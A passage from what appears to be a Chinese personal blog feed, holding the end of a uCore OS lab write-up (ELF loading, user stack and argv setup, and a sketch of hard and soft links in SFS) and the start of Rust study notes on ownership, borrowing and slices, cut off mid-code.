  <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-comment">// LAB8 读取elf对应段内的数据并写入至该内存中</span><br>            <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            start += size, offset += size;<br>        &#125;<br>        end = ph-&gt;p_va + ph-&gt;p_memsz;<br>        <span class="hljs-comment">// 对于段中当前页中剩余的空间（复制elf数据后剩下的空间），将其置为0</span><br>        <span class="hljs-keyword">if</span> (start &lt; la) &#123;<br>            <span class="hljs-comment">/* ph-&gt;p_memsz == ph-&gt;p_filesz */</span><br>            <span class="hljs-keyword">if</span> (start == end) &#123;<br>                <span class="hljs-keyword">continue</span> ;<br>            &#125;<br>            off = start + PGSIZE - la, size = PGSIZE - off;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));<br>        &#125;<br>        <span class="hljs-comment">// 对于段中剩余页中的空间（复制elf数据后的多余页面），将其置为0</span><br>        <span class="hljs-keyword">while</span> (start &lt; end) &#123;<br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="hljs-literal">NULL</span>) &#123;<br>                ret = -E_NO_MEM;<br>                <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>            &#125;<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (end &lt; la) &#123;<br>                size -= la - end;<br>            &#125;<br>            <span class="hljs-built_in">memset</span>(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 关闭读取的ELF</span><br>    sysfile_close(fd);<br><br>    <span class="hljs-comment">// 设置栈内存</span><br>    vm_flags = VM_READ | VM_WRITE | VM_STACK;<br>    <span class="hljs-keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> bad_cleanup_mmap;<br>    &#125;<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-2</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-3</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br>    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="hljs-number">-4</span>*PGSIZE , PTE_USER) != <span class="hljs-literal">NULL</span>);<br><br>    mm_count_inc(mm);<br>    <span class="hljs-comment">// 设置CR3页表相关寄存器</span><br>    current-&gt;mm = mm;<br>    current-&gt;cr3 = PADDR(mm-&gt;pgdir);<br>    lcr3(PADDR(mm-&gt;pgdir));<br><br>    <span class="hljs-comment">//setup argc, argv</span><br>    <span class="hljs-comment">// LAB8 设置execve所启动的程序参数</span><br>    <span class="hljs-keyword">uint32_t</span> argv_size=<span class="hljs-number">0</span>, i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">uintptr_t</span> stacktop = USTACKTOP - (argv_size/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>)+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>);<br>    <span class="hljs-comment">// 直接将传入的参数压入至新栈的底部</span><br>    <span class="hljs-keyword">char</span>** uargv=(<span class="hljs-keyword">char</span> **)(stacktop  - argc * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *));<br><br>    argv_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        uargv[i] = <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)(stacktop + argv_size ), kargv[i]);<br>        argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    stacktop = (<span class="hljs-keyword">uintptr_t</span>)uargv - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>    *(<span class="hljs-keyword">int</span> *)stacktop = argc;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf-&gt;tf_cs = USER_CS;<br>    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;<br>    tf-&gt;tf_esp = stacktop;<br>    tf-&gt;tf_eip = elf-&gt;e_entry;<br>    tf-&gt;tf_eflags = FL_IF;<br>    ret = <span class="hljs-number">0</span>;<br>out:<br>    <span class="hljs-keyword">return</span> ret;<br>bad_cleanup_mmap:<br>    exit_mmap(mm);<br>bad_elf_cleanup_pgdir:<br>    put_pgdir(mm);<br>bad_pgdir_cleanup_mm:<br>    mm_destroy(mm);<br>bad_mm:<br>    <span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>给出设计实现基于”<strong>UNIX的硬链接和软链接机制</strong>“的概要设计方案</p></blockquote><ul><li><p>SFS中已经预留出硬链接/软链接的相关定义（没有实现）</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * VFS layer high-level operations on pathnames</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    vfs_link         - Create a hard link to a file.</span><br><span class="hljs-comment"> *    vfs_symlink      - Create a symlink PATH containing contents CONTENTS.</span><br><span class="hljs-comment"> *    vfs_unlink       - Delete a file/directory.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_link</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *old_path, <span class="hljs-keyword">char</span> *new_path)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_symlink</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *old_path, <span class="hljs-keyword">char</span> *new_path)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_unlink</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path)</span></span>;<br></code></pre></div></td></tr></table></figure></li><li><p>硬链接机制的实现</p><ul><li>创建硬链接时，仍然为<code>new_path</code>建立一个<code>sfs_disk_entry</code>结构，但该结构的内部<code>ino</code>成员指向<code>old_path</code>的磁盘索引结点，并使该磁盘索引节点的<code>nlinks</code>引用计数成员加一即可。</li><li>删除硬链接时，令对应磁盘结点<code>sfs_disk_inode</code>中的<code>nlinks</code>减一，同时删除硬链接的<code>sfs_disk_entry</code>结构即可。</li></ul></li><li><p>软链接的实现</p><ul><li>与创建硬链接不同，创建软链接时要多建立一个<code>sfs_disk_inode</code>结构（即建立一个全新的文件）。之后，将<code>old_path</code>写入该文件中，并标注<code>sfs_disk_inode</code>的<code>type</code>为<code>SFS_TYPE_LINK</code>即可。</li><li>删除软链接与删除文件的操作没有区别，直接将对应的<code>sfs_disk_entry</code>和<code>sfs_disk_inode</code>结构删除即可。</li></ul></li></ul><ul><li>moocos的密码是空格<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>即原先查找页目录表的目的是想将某个线性地址转换为物理地址，但如果页目录表中存放的是二级页表的<strong>线性</strong>地址，则需要先查找该二级页表的物理地址，此时需要递归查找，这可能会出现永远也查找不到物理地址的情况。<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Specialty in Rust</title>
    <link href="/2021-09/Archive-Specialty-in-Rust/"/>
    <url>/2021-09/Archive-Specialty-in-Rust/</url>
    
    <content type="html"><![CDATA[<p><a href="https://kaisery.github.io/trpl-zh-cn">《Rust 程序设计语言》</a> + <a href="https://course.rs/about-book.html">Rust语言圣经(Rust Course)</a> </p><h1 id="Rust-Course"><a href="#Rust-Course" class="headerlink" title="Rust Course"></a>Rust Course</h1><ul><li>使用下划线开头忽略未使用的变量, 以避免警告.</li><li><strong>变量遮蔽</strong>指后遮蔽前变量声明，如果你在某个作用域内无需再使用之前的变量（在被遮蔽后，无法再访问到之前的同名变量），就可以重复的使用变量名字，而不用绞尽脑汁去想更多的名字。</li><li>Rust 是一门静态类型语言, 但是编译器可以自动推导变量类型.</li><li><code>1..5</code>，生成从 1 到 4 的连续数字，不包含 5 ；<code>1..=5</code>，生成从 1 到 5 的连续数字，包含 5</li><li>Rust 是强类型语言，因此需要你为每一个函数参数都标识出它的具体类型</li><li>在新的编译器中, <strong>引用作用域的结束位置从花括号变成最后一次使用的位置</strong>.</li><li></li></ul><h1 id="commandline"><a href="#commandline" class="headerlink" title="commandline"></a>commandline</h1><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">cargo doc <br>cargo doc --open<br>rustc --explain (something)<br></code></pre></div></td></tr></table></figure><h1 id="common-concepts"><a href="#common-concepts" class="headerlink" title="common concepts"></a>common concepts</h1><h2 id="code-example"><a href="#code-example" class="headerlink" title="code example"></a>code example</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> rand::Rng;<br><span class="hljs-keyword">use</span> std::cmp::Ordering;<br><span class="hljs-keyword">use</span> std::io;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Guess the number!&quot;</span>);<br><br>    <span class="hljs-keyword">let</span> secret_number = rand::thread_rng().gen_range(<span class="hljs-number">1</span>..<span class="hljs-number">101</span>);<br><br>    <span class="hljs-keyword">loop</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Please input your guess.&quot;</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> guess = <span class="hljs-built_in">String</span>::new();<br>        io::stdin()<br>            .read_line(&amp;<span class="hljs-keyword">mut</span> guess)<br>            .expect(<span class="hljs-string">&quot;Failed to read line&quot;</span>);<br>        <span class="hljs-keyword">let</span> guess: <span class="hljs-built_in">u32</span> = <span class="hljs-keyword">match</span> guess.trim().parse() &#123;<br>            <span class="hljs-literal">Ok</span>(num) =&gt; num,<br>            <span class="hljs-literal">Err</span>(_) =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br><br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);<br><br>        <span class="hljs-keyword">match</span> guess.cmp(&amp;secret_number) &#123;<br>            Ordering::Less =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too small!&quot;</span>),<br>            Ordering::Greater =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too big!&quot;</span>),<br>            Ordering::Equal =&gt; &#123;<br>                <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You win!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>cargo doc --open</code> doc is stored in the folder.</li><li>something special in enumeration waiting for me to be explored </li><li>Rust <strong>doesn’t care where you define your functions, only that they’re defined somewhere.</strong>  </li><li>Statements do not return values. Therefore, you can’t assign a <code>let</code> statement to another variable, and can’t use x=y=6 to have both x and y have the value 6</li><li>Rust will do check of every <strong>array indexing operation</strong>, thus will run slowly</li></ul><h2 id="about-return-statement"><a href="#about-return-statement" class="headerlink" title="about return statement"></a>about return statement</h2><ul><li>Block is expression, expressions do not include ending semicolons. Most functions return the last <strong>expression</strong> implicitly. Assigning a block of statements to a variable will get an empty tuple, expressed by “()”.</li></ul><h2 id="if-expressions"><a href="#if-expressions" class="headerlink" title="if expressions"></a>if <strong><code>expressions</code></strong></h2><ul><li>no parentheses in <code>return</code> and <code>if</code> keyword, Blocks of code associated with the conditions in <code>if</code> expressions are sometimes called <em><strong>arms</strong></em> </li><li>Rust will not automatically try to convert non-Boolean types to a Boolean, do not use integer as the condition of <code>if</code>, instead using an integer greater or less than or equal to an certain number. </li><li>if else if else if …… may be changed to <code>match</code>  </li><li><code>let number = if condition &#123; 5 &#125; else &#123; 6 &#125;;</code> don’t use different types in each <strong>arms</strong>.</li></ul><h2 id="Repeating"><a href="#Repeating" class="headerlink" title="Repeating"></a>Repeating</h2><ul><li><strong><code>loop</code></strong>(use <code>break</code> and <code>^C</code> to terminate)  , <code>while</code>, and <code>for</code> </li><li><code>break</code> can <strong>take a value</strong> as the return of the <code>loop</code> </li><li>use <code>for element in a.iter()</code> to speed up array indexing </li><li><code>for</code> : <code>for number in (1..4).rev()</code> </li></ul><h1 id="ownership"><a href="#ownership" class="headerlink" title="ownership"></a>ownership</h1><blockquote><p>Ownership is Rust’s most unique feature, and it enables Rust to make memory safety guarantees without needing a garbage collector.    </p><p>Memory Management: Memory is managed through a system of ownership with a set of rules that the compiler checks at <strong>compile time</strong>, won’t slow down your program.</p></blockquote><h2 id="ownership-rules"><a href="#ownership-rules" class="headerlink" title="ownership rules:"></a>ownership rules:</h2><blockquote><ol><li>Each value in Rust has a variable that’s called its <em>owner</em>.</li><li>There can only be one owner at a time.</li><li>When the owner goes out of scope, the value will be dropped.</li></ol></blockquote><ul><li><p><strong>immutable</strong> string literals and the <strong>changeable</strong> String type </p></li><li><p>create a <code>String</code> from a string literal using the <code>from</code> function: <code>let s = String::from(&quot;hello&quot;);</code> </p></li><li><p>Rust takes a different path from those languages having GC: the memory is <u>automatically returned</u> once the variable that owns it goes out of scope.</p></li><li><p>Rust calls a special function for us. This function is called <a href="https://doc.rust-lang.org/std/ops/trait.Drop.html#tymethod.drop"><code>drop</code></a>, and it’s where the author of <code>String</code> can put the code to return the memory. Rust calls <code>drop</code> automatically at the closing curly bracket.</p></li><li><p>the following code will lead to a move instead of a shallow or deep copy, or you can use <code>s1.clone()</code> to do deep copy</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = s1;<br></code></pre></div></td></tr></table></figure></li><li><p>there is <code>copy</code> and <code>drop</code> trait, which won’t coexist, the former will leave old value as valid.</p></li><li><p><strong>Ownership and Functions</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">// s comes into scope</span><br><br>    takes_ownership(s);             <span class="hljs-comment">// s&#x27;s value moves into the function...</span><br>                                    <span class="hljs-comment">// ... and so is no longer valid here</span><br><br>    <span class="hljs-keyword">let</span> x = <span class="hljs-number">5</span>;                      <span class="hljs-comment">// x comes into scope</span><br><br>    makes_copy(x);                  <span class="hljs-comment">// x would move into the function,</span><br>                                    <span class="hljs-comment">// but i32 is Copy, so it&#x27;s okay to still</span><br>                                    <span class="hljs-comment">// use x afterward</span><br><br>&#125; <span class="hljs-comment">// Here, x goes out of scope, then s. But because s&#x27;s value was moved, nothing</span><br>  <span class="hljs-comment">// special happens.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_ownership</span></span>(some_string: <span class="hljs-built_in">String</span>) &#123; <span class="hljs-comment">// some_string comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_string);<br>&#125; <span class="hljs-comment">// Here, some_string goes out of scope and `drop` is called. The backing</span><br>  <span class="hljs-comment">// memory is freed.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">makes_copy</span></span>(some_integer: <span class="hljs-built_in">i32</span>) &#123; <span class="hljs-comment">// some_integer comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_integer);<br>&#125; <span class="hljs-comment">// Here, some_integer goes out of scope. Nothing special happens.</span><br></code></pre></div></td></tr></table></figure></li><li><p><strong>Return Values and Scope</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = gives_ownership();         <span class="hljs-comment">// gives_ownership moves its return</span><br>                                        <span class="hljs-comment">// value into s1</span><br><br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);     <span class="hljs-comment">// s2 comes into scope</span><br><br>    <span class="hljs-keyword">let</span> s3 = takes_and_gives_back(s2);  <span class="hljs-comment">// s2 is moved into</span><br>                                        <span class="hljs-comment">// takes_and_gives_back, which also</span><br>                                        <span class="hljs-comment">// moves its return value into s3</span><br>&#125; <span class="hljs-comment">// Here, s3 goes out of scope and is dropped. s2 goes out of scope but was</span><br>  <span class="hljs-comment">// moved, so nothing happens. s1 goes out of scope and is dropped.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">gives_ownership</span></span>() -&gt; <span class="hljs-built_in">String</span> &#123;             <span class="hljs-comment">// gives_ownership will move its</span><br>                                             <span class="hljs-comment">// return value into the function</span><br>                                             <span class="hljs-comment">// that calls it</span><br><br>    <span class="hljs-keyword">let</span> some_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>); <span class="hljs-comment">// some_string comes into scope</span><br><br>    some_string                              <span class="hljs-comment">// some_string is returned and</span><br>                                             <span class="hljs-comment">// moves out to the calling</span><br>                                             <span class="hljs-comment">// function</span><br>&#125;<br><br><span class="hljs-comment">// takes_and_gives_back will take a String and return one</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_and_gives_back</span></span>(a_string: <span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">String</span> &#123; <span class="hljs-comment">// a_string comes into</span><br>                                                      <span class="hljs-comment">// scope</span><br><br>    a_string  <span class="hljs-comment">// a_string is returned and moves out to the calling function</span><br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h2 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h2><ul><li>we call having references as function parameters <em>borrowing</em> </li><li>Reference’s <strong>default  immutable</strong>  </li><li><strong>Use mutabel parameter:</strong> <ol><li>First, we had to change <strong>variable</strong> <code>s</code> to be <code>mut</code>. </li><li>Then we had to create a mutable reference with <code>&amp;mut s</code> </li><li>and accept a mutable reference in the function with <code>some_string: &amp;mut String</code>.</li></ol></li><li><strong>you can have only one mutable reference to a particular piece of data in a particular scope(avoiding <em>race</em>)</strong></li></ul><blockquote><p>A <em><strong>data race</strong></em> is similar to a race condition and happens when these three behaviors occur:</p><ul><li>Two or more pointers access the same data at the same time.</li><li>At least one of the pointers is being used to write to the data.</li><li>There’s no mechanism being used to synchronize access to the data.</li></ul><p>The Rust prevents it by giving out an error.</p></blockquote><ul><li>E0502: A variable already borrowed as immutable was borrowed as mutable. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// a is borrowed as immutable.</span><br>    bar(a);     <span class="hljs-comment">// as immutable</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>To fix this error, ensure that you don’t have any other references to the variable before trying to access it mutably:   </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    bar(a);<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// ok!</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y); <br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="The-slice-type"><a href="#The-slice-type" class="headerlink" title="The slice type"></a>The slice type</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">usize</span> &#123;<br>    <span class="hljs-keyword">let</span> bytes = s.as_bytes();<br><br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123; <br><span class="hljs-comment">//iter is a method that returns each element in a collection and that enumerate wraps the result of iter </span><br>    <span class="hljs-comment">//and returns each element as part of a tuple instead.(first index, second the reference)</span><br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    s.len()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    <span class="hljs-keyword">let</span> word = first_word(&amp;s); <span class="hljs-comment">// word will get the value 5</span><br>    s.clear(); <span class="hljs-comment">// this empties the String, making it equal to &quot;&quot;</span><br>    <span class="hljs-comment">// word still has the value 5 here, but there&#x27;s no more string that</span><br>    <span class="hljs-comment">// we could meaningfully use the value 5 with. word is now totally invalid!</span><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>return a <em>string slice</em> instead of an index </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;<span class="hljs-comment">//The type that signifies “string slice” is written as &amp;str</span><br>    <span class="hljs-keyword">let</span> bytes = s.as_bytes();<br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123;<br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> &amp;s[<span class="hljs-number">0</span>..i];<br>        &#125;<br>    &#125;<br>    &amp;s[..] <span class="hljs-comment">//equals &amp;s[0..len]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">str</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;&#125;<span class="hljs-comment">//use the same function on both &amp;String values and &amp;str values.</span><br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span 